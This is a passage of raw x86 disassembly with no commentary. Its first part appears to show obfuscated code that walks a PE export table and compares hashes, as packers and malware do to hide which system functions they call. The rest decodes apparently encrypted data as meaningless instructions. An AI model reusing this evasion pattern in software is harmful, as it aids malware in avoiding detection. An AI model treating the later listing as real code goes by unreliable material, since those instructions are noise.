  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x910729ff,eax
  408b09:	adc    bh,bl
  408b0b:	jmp    0x7b9c:0x137b7be5
  408b12:	jnp    0x408b5c
  408b14:	ins    DWORD PTR es:[edi],dx
  408b15:	popf   
  408b16:	pop    ebx
  408b17:	push   ebp
  408b18:	fbstp  TBYTE PTR ds:0x6eeede6b
  408b1e:	fwait
  408b1f:	scas   al,BYTE PTR es:[edi]
  408b20:	jmp    0xbccf7da5
  408b25:	adc    dl,0x6d
  408b28:	je     0x408ba9
  408b2a:	adc    DWORD PTR [edi+0x167e4786],esp
  408b30:	jmp    0xa6bba982
  408b35:	add    esp,ebp
  408b37:	dec    ecx
  408b38:	ret    0x2bc4
  408b3b:	cmc    
  408b3c:	es nop
  408b3e:	ins    DWORD PTR es:[edi],dx
  408b3f:	add    al,0x13
  408b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b42:	adc    bl,BYTE PTR [eax-0x77]
  408b45:	aad    0xce
  408b47:	pop    esi
  408b48:	lods   al,BYTE PTR ds:[esi]
  408b49:	mov    WORD PTR [edi-0x1b],gs
  408b4c:	lods   al,BYTE PTR ds:[esi]
  408b4d:	push   ds
  408b4e:	lahf   
  408b4f:	cmp    al,0x77
  408b51:	inc    ebp
  408b52:	ins    BYTE PTR es:[edi],dx
  408b53:	jns    0x408ba8
  408b55:	retf   0x78df
  408b58:	jb     0x408b36
  408b5a:	mov    al,ds:0x7152ad68
  408b5f:	(bad)  
  408b60:	loopne 0x408b89
  408b62:	inc    edi
  408b63:	je     0x408b93
  408b65:	scas   al,BYTE PTR es:[edi]
  408b66:	rcr    esp,cl
  408b68:	(bad)  
  408b69:	xor    al,0x5c
  408b6b:	jmp    0x67e072e8
  408b70:	inc    ebx
  408b71:	jmp    0xfd1aace1
  408b76:	push   edx
  408b77:	int3   
  408b78:	push   edx
  408b79:	sub    eax,0xef812a3e
  408b7e:	test   bl,0xef
  408b81:	fistp  QWORD PTR [ecx-0x1c]
  408b84:	scas   eax,DWORD PTR es:[edi]
  408b85:	dec    edi
  408b86:	adc    edx,DWORD PTR [ecx]
  408b88:	and    eax,0x56839fa7
  408b8d:	in     al,dx
  408b8e:	xchg   edi,eax
  408b8f:	pusha  
  408b90:	js     0x408b91
  408b92:	mov    ecx,0x26c715f
  408b97:	cmp    eax,0xef06f679
  408b9c:	fmul   st(2),st
  408b9e:	iret   
  408b9f:	enter  0x5b29,0xd6
  408ba3:	jo     0x408bc0
  408ba5:	retf   0xdb3f
  408ba8:	mov    dl,0x84
  408baa:	add    edx,0xdf8c36d0
  408bb0:	add    BYTE PTR [edi-0x3c],0xd5
  408bb4:	ins    DWORD PTR es:[edi],dx
  408bb5:	dec    edi
  408bb6:	inc    edi
  408bb7:	adc    al,0xde
  408bb9:	push   edi
  408bba:	hlt    
  408bbb:	or     BYTE PTR [edx+0x11f1ec79],ah
  408bc1:	mov    BYTE PTR es:[esi-0x32],ch
  408bc5:	inc    edi
  408bc6:	dec    esp
  408bc7:	fwait
  408bc8:	mov    al,ds:0xe1346a06
  408bcd:	bound  esi,QWORD PTR [ebx+0x6461c1dd]
  408bd3:	loopne 0x408be7
  408bd5:	enter  0xc8d6,0x48
  408bd9:	int    0x6d
  408bdb:	jbe    0x408b5d
  408bdd:	mov    BYTE PTR [edx-0x11459736],dl
  408be3:	les    edx,FWORD PTR [ecx-0x626269bc]
  408be9:	dec    eax
  408bea:	push   ebp
  408beb:	mov    edx,0x50726e25
  408bf0:	mov    ecx,0x1a8b250f
  408bf5:	inc    eax
  408bf6:	mov    cl,0xdf
  408bf8:	in     al,dx
  408bf9:	sub    ebx,DWORD PTR [esi-0x38]
  408bfc:	ds cld 
  408bfe:	cld    
  408bff:	test   DWORD PTR [ecx+0x12302df9],ebx
  408c05:	in     eax,0x93
  408c07:	imul   eax,DWORD PTR [edx+0x2f3d9cd5],0x51
  408c0e:	daa    
  408c0f:	fnstsw WORD PTR [esi+0x5ac7ff30]
  408c15:	xor    DWORD PTR [esi-0x690625d0],ecx
  408c1b:	inc    bl
  408c1d:	inc    edi
  408c1e:	sub    bl,BYTE PTR [edx+0x67]
  408c21:	mov    esp,0xff543997
  408c26:	cmp    ch,BYTE PTR [ebx-0x4cbf45ae]
  408c2c:	fld    DWORD PTR [ebx]
  408c2e:	jmp    0x23361e58
  408c33:	imul   edx,DWORD PTR [esp+edx*1],0x64f5a5e
  408c3a:	inc    ebp
  408c3b:	inc    ebp
  408c3c:	mov    ebx,0x81593fb9
  408c41:	retf   0x64a8
  408c44:	inc    edi
  408c45:	cli    
  408c46:	adc    eax,0xe9a65ca4
  408c4b:	jp     0x408c98
  408c4d:	shl    edi,cl
  408c4f:	adc    esp,DWORD PTR [edi]
  408c51:	mov    bl,bh
  408c53:	jno    0x408c48
  408c55:	adc    eax,0x59b3b761
  408c5a:	loope  0x408c09
  408c5c:	test   al,0x6b
  408c5e:	mov    esp,0xe9958e97
  408c63:	or     DWORD PTR [ecx-0x2c331091],edx
  408c69:	gs cmc 
  408c6b:	xlat   BYTE PTR ds:[ebx]
  408c6c:	mov    cs,WORD PTR [esi+edi*8-0x72]
  408c70:	out    dx,al
  408c71:	sub    ch,BYTE PTR [edx]
  408c73:	cmp    edx,esi
  408c75:	push   cs
  408c76:	and    al,dh
  408c78:	mov    edi,0x4a5c0f13
  408c7d:	xchg   edi,eax
  408c7e:	fnstsw WORD PTR [edx-0x476655e4]
  408c84:	jno    0x408c64
  408c86:	retf   0x5039
  408c89:	mov    dh,0xe6
  408c8b:	loop   0x408c16
  408c8d:	jne    0x408cac
  408c8f:	jbe    0x408ca7
  408c91:	pushf  
  408c92:	fs mov eax,0x7f3b43d2
  408c98:	mov    al,ds:0x179072
  408c9d:	retf   
  408c9e:	xor    eax,0x4a9afa8a
  408ca3:	pop    ebp
  408ca4:	test   cl,bl
  408ca6:	adc    edi,ecx
  408ca8:	cli    
  408ca9:	retf   0xbb7f
  408cac:	jle    0x408cd7
  408cae:	cmp    BYTE PTR [edi-0x7],dh
  408cb1:	in     al,0xb5
  408cb3:	dec    ecx
  408cb4:	push   edx
  408cb5:	mov    cl,BYTE PTR [ebp+0x60]
  408cb8:	ins    DWORD PTR es:[edi],dx
  408cb9:	adc    edx,DWORD PTR [eax]
  408cbb:	pop    edi
  408cbc:	imul   esi,DWORD PTR [eax-0x290a502a],0x1f
  408cc3:	ds or  ebp,ecx
  408cc6:	or     eax,0xe4a4c17d
  408ccb:	mov    ss,WORD PTR [edi+0x1c]
  408cce:	gs pop eax
  408cd0:	xorps  xmm5,XMMWORD PTR [ebp-0x5be7704]
  408cd7:	push   edi
  408cd8:	push   ss
  408cd9:	daa    
  408cda:	test   BYTE PTR [ecx+0x77cbd923],ah
  408ce0:	retf   0xc172
  408ce3:	es dec edi
  408ce5:	sar    BYTE PTR [ebx-0x1c4fe299],cl
  408ceb:	mov    ebx,DWORD PTR [edi]
  408ced:	push   ds
  408cee:	jl     0x408cc0
  408cf0:	idiv   ah
  408cf2:	xchg   esi,eax
  408cf3:	outs   dx,BYTE PTR ds:[esi]
  408cf4:	and    DWORD PTR [eax+0x7a],edx
  408cf7:	out    0xe8,eax
  408cf9:	inc    eax
  408cfa:	scas   eax,DWORD PTR es:[edi]
  408cfb:	mov    ebx,edx
  408cfd:	sub    ch,cl
  408cff:	out    0xc9,eax
  408d01:	call   0x9caa:0xad0dc226
  408d08:	add    edi,edi
  408d0a:	cs retw 
  408d0d:	loop   0x408d05
  408d0f:	ror    BYTE PTR [esi+0x1b],cl
  408d12:	jae    0x408ca3
  408d14:	(bad)  
  408d15:	and    eax,0x3697b17f
  408d1a:	es stos DWORD PTR es:[edi],eax
  408d1c:	and    eax,0x4e374e11
  408d21:	call   0x7b48678f
  408d26:	test   bh,0x9
  408d29:	fld    QWORD PTR [edx+0x484d3e8b]
  408d2f:	mov    bl,0x4d
  408d31:	ja     0x408cdb
  408d33:	add    cl,BYTE PTR gs:[edx+0x3f9d4ce9]
  408d3a:	dec    ebp
  408d3b:	fwait
  408d3c:	jp     0x408d99
  408d3e:	aaa    
  408d3f:	add    ch,BYTE PTR [eax+0x279ebb34]
  408d45:	jecxz  0x408d96
  408d47:	ss out dx,al
  408d49:	test   al,0x97
  408d4b:	inc    esp
  408d4c:	test   al,0x8c
  408d4e:	lock dec ebx
  408d50:	sbb    edx,DWORD PTR [ebp-0x67fb2973]
  408d56:	cs cwde 
  408d58:	adc    ebp,ebx
  408d5a:	push   edi
  408d5b:	mov    esi,DWORD PTR [esi]
  408d5d:	out    0x9e,eax
  408d5f:	xor    eax,0x7f6004b4
  408d64:	sbb    al,0xe9
  408d66:	lock shl BYTE PTR [edi+eiz*1+0xf],cl
  408d6b:	mov    al,0x10
  408d6d:	xchg   edx,eax
  408d6e:	jno    0x408d9c
  408d70:	dec    ebx
  408d71:	push   0x17
  408d73:	inc    edx
  408d74:	mov    esi,0x4dd3de74
  408d79:	jmp    FWORD PTR [edi-0x582ce435]
  408d7f:	cmp    BYTE PTR [edx],bl
  408d81:	pop    ecx
  408d82:	shr    DWORD PTR [ebx-0x1a557c29],cl
  408d88:	rol    DWORD PTR [ecx-0x41],0xec
  408d8c:	dec    edx
  408d8d:	inc    edi
  408d8e:	rcr    edx,0x63
  408d91:	push   eax
  408d92:	dec    esi
  408d93:	add    eax,0x39a2e03f
  408d98:	sub    DWORD PTR [eax+0x78a0262a],esi
  408d9e:	ss jne 0x408dbe
  408da1:	push   ecx
  408da2:	xchg   ebx,eax
  408da3:	retf   0xcec8
  408da6:	sub    eax,DWORD PTR [esp+eax*2]
  408da9:	mov    ds:0xbed0a9d9,eax
  408dae:	mov    cl,0x5b
  408db0:	ins    BYTE PTR es:[edi],dx
  408db1:	jno    0x408d86
  408db3:	dec    ebx
  408db4:	add    cl,BYTE PTR [edx+0x52]
  408db7:	(bad)  
  408db8:	in     al,0xd5
  408dba:	pop    es
  408dbb:	xchg   DWORD PTR [ebx-0x3a],eax
  408dbe:	add    esi,DWORD PTR [edx]
  408dc0:	dec    ebx
  408dc1:	push   edi
  408dc2:	jl     0x408dbb
  408dc4:	fisubr WORD PTR [edi-0x55]
  408dc7:	push   ebx
  408dc8:	lods   al,BYTE PTR ds:[esi]
  408dc9:	add    al,0xdb
  408dcb:	add    ebx,DWORD PTR [edi-0x26]
  408dce:	cmp    eax,0x55c3bff5
  408dd3:	(bad)  
  408dd4:	mov    al,ds:0x5b0b3b64
  408dd9:	ins    BYTE PTR es:[edi],dx
  408dda:	inc    ecx
  408ddb:	mov    ch,0x83
  408ddd:	lds    ebx,FWORD PTR [edx+0x5b]
  408de0:	ds jnp 0x408e00
  408de3:	daa    
  408de4:	retf   
  408de5:	push   esp
  408de6:	mov    bh,0xf5
  408de8:	cwde   
  408de9:	call   0xe4d1:0x546254ad
  408df0:	jle    0x408dd3
  408df2:	cmp    bl,BYTE PTR [eax-0x30]
  408df5:	addr16 in al,dx
  408df7:	rcr    DWORD PTR [eax],0x67
  408dfa:	xor    BYTE PTR [edx],0x8b
  408dfd:	push   esi
  408dfe:	inc    ebp
  408dff:	out    dx,eax
  408e00:	ret    
  408e01:	mov    WORD PTR [eax+edi*1-0x5d65d989],cs
  408e08:	mov    esp,0x41446ced
  408e0d:	shr    BYTE PTR [esi],0xe7
  408e10:	retf   0x5678
  408e13:	out    dx,eax
  408e14:	sub    cl,BYTE PTR [edi]
  408e16:	cmp    al,0x75
  408e18:	adc    eax,0x69c1d996
  408e1d:	fmul   DWORD PTR [esi]
  408e1f:	xor    eax,0x74559dbf
  408e24:	mov    ebp,DWORD PTR [ebx+0x6f0e7d42]
  408e2a:	push   es
  408e2b:	xchg   DWORD PTR ds:0x8d44db12,ebx
  408e31:	test   DWORD PTR [ecx+esi*8+0x10e22651],0x95ecff78
  408e3c:	sar    BYTE PTR [ecx],cl
  408e3e:	pop    esp
  408e3f:	push   ecx
  408e40:	mov    ebp,?
  408e42:	mov    edx,DWORD PTR [edx+0x3e]
  408e45:	mov    ds:0x1cff228a,eax
  408e4a:	push   eax
  408e4b:	daa    
  408e4c:	int    0x90
  408e4e:	and    cl,BYTE PTR [esi+0x3d]
  408e51:	jnp    0x408e2f
  408e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e54:	lds    edx,FWORD PTR [esi]
  408e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e57:	loop   0x408eca
  408e59:	sbb    dh,BYTE PTR [ebp+0x5654155d]
  408e5f:	daa    
  408e60:	push   edx
  408e61:	fstp   QWORD PTR [eax+ebp*4]
  408e64:	mov    ch,0x4e
  408e66:	shrd   esi,esi,0x13
  408e6a:	js     0x408df9
  408e6c:	popf   
  408e6d:	je     0x408e5a
  408e6f:	and    BYTE PTR [ecx],cl
  408e71:	xchg   esp,eax
  408e72:	pop    edi
  408e73:	xchg   DWORD PTR [ebx],ecx
  408e75:	lahf   
  408e76:	js     0x408ee5
  408e78:	or     esi,DWORD PTR [edx]
  408e7a:	fidivr WORD PTR [esi+0x6c]
  408e7d:	mov    ebx,DWORD PTR [esi+0x2d21b1d2]
  408e83:	mov    ebp,DWORD PTR [ecx-0x3083ec12]
  408e89:	and    edi,ebx
  408e8b:	push   ds
  408e8c:	and    edi,DWORD PTR [edx+0x63]
  408e8f:	xchg   esi,eax
  408e90:	add    al,0x6e
  408e92:	out    dx,al
  408e93:	adc    esp,eax
  408e95:	adc    BYTE PTR [eax],dh
  408e97:	jo     0x408e90
  408e99:	cmp    eax,0x1e307709
  408e9e:	cld    
  408e9f:	mov    al,BYTE PTR [edi+0x76574bb0]
  408ea5:	mov    ds:0x8ed5a3e,al
  408eaa:	js     0x408e7d
  408eac:	inc    ebx
  408ead:	aad    0x16
  408eaf:	sbb    DWORD PTR [ebx+esi*2-0x6e499715],edi
  408eb6:	push   ebx
  408eb7:	call   0xbaf9cd22
  408ebc:	dec    ebx
  408ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ebe:	push   ecx
  408ebf:	call   0xb7887e14
  408ec4:	mov    ch,0x75
  408ec6:	stc    
  408ec7:	xrstor [ecx]
  408eca:	std    
  408ecb:	js     0x408ea7
  408ecd:	ins    BYTE PTR es:[edi],dx
  408ece:	ins    DWORD PTR es:[edi],dx
  408ecf:	mov    ebp,0x317bf228
  408ed4:	inc    edi
  408ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed6:	(bad)  
  408ed7:	pop    ds
  408ed8:	inc    edi
  408ed9:	sbb    dl,cl
  408edb:	cmp    DWORD PTR [ecx+esi*4+0xe361560],edi
  408ee2:	das    
  408ee3:	pop    ebx
  408ee4:	retf   0xdfdf
  408ee7:	ficomp WORD PTR [esi-0x67]
  408eea:	aaa    
  408eeb:	sahf   
  408eec:	add    edx,DWORD PTR [ecx-0x14]
  408eef:	test   al,0x18
  408ef1:	inc    edi
  408ef2:	pop    ecx
  408ef3:	aaa    
  408ef4:	ins    BYTE PTR es:[edi],dx
  408ef5:	add    dh,BYTE PTR [ecx+0x65]
  408ef8:	xor    al,0x41
  408efa:	ins    DWORD PTR es:[edi],dx
  408efb:	jle    0x408ec5
  408efd:	dec    DWORD PTR [edx]
  408eff:	push   edx
  408f00:	mov    dh,0xcb
  408f02:	std    
  408f03:	inc    esi
  408f04:	cwde   
  408f05:	aam    0x85
  408f07:	and    bh,BYTE PTR [ebx+0x14]
  408f0a:	push   eax
  408f0b:	push   ecx
  408f0c:	sub    esp,DWORD PTR ds:0x28802e51
  408f12:	rol    DWORD PTR [ecx-0x514ad57b],1
  408f18:	cmp    eax,0x402eea9e
  408f1d:	xchg   esi,eax
  408f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f1f:	inc    edx
  408f20:	pop    edx
  408f21:	push   ebp
  408f22:	sar    DWORD PTR [edx],cl
  408f24:	ds leave 
  408f26:	xchg   ebp,eax
  408f27:	mov    edx,0x498f8f35
  408f2c:	call   eax
  408f2e:	in     eax,0xba
  408f30:	into   
  408f31:	cli    
  408f32:	jnp    0x408f26
  408f34:	jmp    0x408f99
  408f36:	dec    edi
  408f37:	xor    eax,0x986a7033
  408f3c:	and    al,BYTE PTR [esp+edi*8-0x4d236f25]
  408f43:	out    0x30,al
  408f45:	imul   ebx,DWORD PTR [ebx+0x5fbd9ff2],0xe04674dd
  408f4f:	sbb    al,0xfd
  408f51:	sub    BYTE PTR [ebx-0x5c797343],ch
  408f57:	mov    ebp,0x7c7272a1
  408f5c:	add    esi,DWORD PTR [edx]
  408f5e:	pop    esi
  408f5f:	sbb    dh,bh
  408f61:	div    DWORD PTR [eax+esi*2+0x76f9c100]
  408f68:	iret   
  408f69:	(bad)  
  408f6a:	lds    ebx,FWORD PTR [esi+ecx*4+0x78837006]
  408f71:	in     al,dx
  408f72:	jle    0x408f02
  408f74:	ds push esp
  408f76:	(bad)  
  408f77:	fidivr DWORD PTR [eax+0xb]
  408f7a:	ret    0x801f
  408f7d:	rcl    BYTE PTR [esi],1
  408f7f:	pop    es
  408f80:	pop    DWORD PTR [ecx]
  408f82:	(bad)  
  408f83:	outs   dx,BYTE PTR ds:[esi]
  408f84:	nop
  408f85:	lahf   
  408f86:	mov    ebp,0xfb1b3e03
  408f8b:	enter  0xcbd8,0x85
  408f8f:	mov    ebp,0xbf64c32
  408f94:	mov    eax,0x7ae91f64
  408f99:	stc    
  408f9a:	fistp  QWORD PTR [eax-0x31dc0eb8]
  408fa0:	(bad)  
  408fa2:	mov    ch,0xc7
  408fa4:	into   
  408fa5:	sub    bh,BYTE PTR [esi+0x4d]
  408fa8:	or     al,0x99
  408faa:	bnd jae 0x409013
  408fad:	adc    BYTE PTR [ebx-0x353fb7bb],ch
  408fb3:	inc    ebp
  408fb4:	or     BYTE PTR [edi+0x33],al
  408fb7:	repnz rcr esp,0x78
  408fbb:	arpl   si,ax
  408fbd:	idiv   BYTE PTR [ecx]
  408fbf:	in     al,dx
  408fc0:	(bad)  
  408fc1:	in     eax,dx
  408fc2:	je     0x408f6f
  408fc4:	or     DWORD PTR [esp+eax*8+0x4ecde085],ebx
  408fcb:	call   0x74a10d3c
  408fd0:	call   0x44baa314
  408fd5:	sub    DWORD PTR [eax+ecx*2-0x39dd5c3],edx
  408fdc:	lods   eax,DWORD PTR ds:[esi]
  408fdd:	and    DWORD PTR [ebx+edx*1+0x11],edi
  408fe1:	clc    
  408fe2:	adc    ecx,DWORD PTR [ebx-0x49012b33]
  408fe8:	mov    bl,0xab
  408fea:	call   0xfc61b8c7
  408fef:	pop    ecx
  408ff0:	and    ebp,ebp
  408ff2:	add    al,ah
  408ff4:	rcr    esp,0xcc
  408ff7:	fsub   QWORD PTR [eax-0x52acdec8]
  408ffd:	sub    ebp,DWORD PTR [eax-0x3]
  409000:	sti    
  409001:	add    al,0xf8
  409003:	cld    
  409004:	xor    al,0xfb
  409006:	jl     0x409055
  409008:	add    al,0x4e
  40900a:	into   
  40900b:	cmp    BYTE PTR [edi-0x45522784],cl
  409011:	pop    ecx
  409012:	cld    
  409013:	mov    ebx,DWORD PTR [ecx]
  409015:	mov    BYTE PTR [esi-0x7],ch
  409018:	aam    0x58
  40901a:	push   ebp
  40901b:	jb     0x408fce
  40901d:	dec    ecx
  40901e:	aaa    
  40901f:	lea    edx,[ecx-0x59]
  409022:	(bad)  
  409023:	mov    DWORD PTR [edi-0x1],edx
  409026:	push   es
  409027:	cld    
  409028:	shr    BYTE PTR [ecx-0x2aec36dc],0x30
  40902f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409030:	loopne 0x409086
  409032:	push   esp
  409033:	(bad)  
  409034:	add    al,0xec
  409036:	fld    DWORD PTR [ecx-0x6103ef23]
  40903c:	pop    esi
  40903d:	in     al,0x99
  40903f:	pop    ebp
  409040:	xchg   edi,eax
  409041:	xchg   ebp,eax
  409042:	cli    
  409043:	test   DWORD PTR [eax+0x3a1bea35],ebp
  409049:	stc    
  40904a:	xor    al,0xe1
  40904c:	push   ecx
  40904d:	(bad)  
  40904e:	out    dx,al
  40904f:	or     al,cl
  409051:	xchg   BYTE PTR [edx-0x7c],cl
  409054:	out    dx,al
  409055:	addr16 push cs
  409057:	adc    DWORD PTR ss:[ecx],esi
  40905a:	test   BYTE PTR [edx],cl
  40905c:	xchg   edi,eax
  40905d:	int3   
  40905e:	js     0x4090bb
  409060:	push   edx
  409061:	gs mov al,0x4e
  409064:	es push esp
  409066:	inc    ebp
  409067:	inc    ecx
  409068:	add    al,0xed
  40906a:	ficom  WORD PTR [ecx-0x31]
  40906d:	sbb    esp,edx
  40906f:	daa    
  409070:	mov    ebp,0x7022324f
  409075:	imul   ecx,DWORD PTR [eax],0x18714686
  40907b:	and    al,0x54
  40907d:	mov    dh,BYTE PTR [ecx-0x7866dfe1]
  409083:	sbb    al,bh
  409085:	cs mov eax,0xdd66d0e7
  40908b:	mov    al,0xd0
  40908d:	xor    ch,BYTE PTR [edi]
  40908f:	mov    esp,0x8f959b52
  409094:	ficom  DWORD PTR [esi-0x47ed2b94]
  40909a:	inc    edi
  40909b:	arpl   WORD PTR ds:0x8ba3b600,di
  4090a1:	add    al,0x8
  4090a3:	mov    edx,DWORD PTR [edx-0x62]
  4090a6:	jecxz  0x409117
  4090a8:	sbb    ah,dh
  4090aa:	pop    edi
  4090ab:	(bad)
  4090af:	mov    dh,0x3
  4090b1:	mov    ebp,0x5544d452
  4090b6:	xchg   ebx,eax
  4090b7:	adc    bl,bl
  4090b9:	xor    BYTE PTR [edi],al
  4090bb:	mov    bl,0xb1
  4090bd:	stc    
  4090be:	rcl    BYTE PTR [eax+0x63708f77],0xf7
  4090c5:	sahf   
  4090c6:	in     al,dx
  4090c7:	mov    BYTE PTR [ebx+0x44],bl
  4090ca:	popf   
  4090cb:	imul   edx,DWORD PTR [ecx+0x2d],0x7b
  4090cf:	jmp    0xa97e:0x7ed06bbc
  4090d6:	xor    al,0x9f
  4090d8:	push   ebp
  4090d9:	add    ah,BYTE PTR [ebx]
  4090db:	adc    al,BYTE PTR [edx]
  4090dd:	out    dx,eax
  4090de:	shl    BYTE PTR [esp+ebx*4+0x60],1
  4090e2:	repnz and BYTE PTR [ebp-0x5f],bh
  4090e6:	hlt    
  4090e7:	nop
  4090e8:	xor    esi,DWORD PTR [edi+0x178c391b]
  4090ee:	add    edx,DWORD PTR [eax-0x4c8b5d5d]
  4090f4:	hlt    
  4090f5:	imul   edi,DWORD PTR [ecx+0x57833dc4],0x1ee6deee
  4090ff:	mov    al,0x26
  409101:	ins    DWORD PTR es:[edi],dx
  409102:	call   0xfc01:0x5328c539
  409109:	pop    edx
  40910a:	loopne 0x409179
  40910c:	(bad)  
  40910d:	sar    BYTE PTR [esi+0x7440baaa],1
  409113:	sbb    edi,DWORD PTR [ebx-0x16]
  409116:	pop    ebp
  409117:	push   ebx
  409118:	(bad)  
  409119:	jae    0x4090d1
  40911b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40911c:	lods   eax,DWORD PTR ds:[esi]
  40911d:	loop   0x409130
  40911f:	cs (bad) 
  409121:	mov    WORD PTR [ecx],?
  409123:	mov    edi,0x1b0c6fc7
  409128:	in     al,0x6a
  40912a:	sub    DWORD PTR [eax-0x42],ebx
  40912d:	adc    edi,0xffffffc8
  409130:	ins    DWORD PTR es:[edi],dx
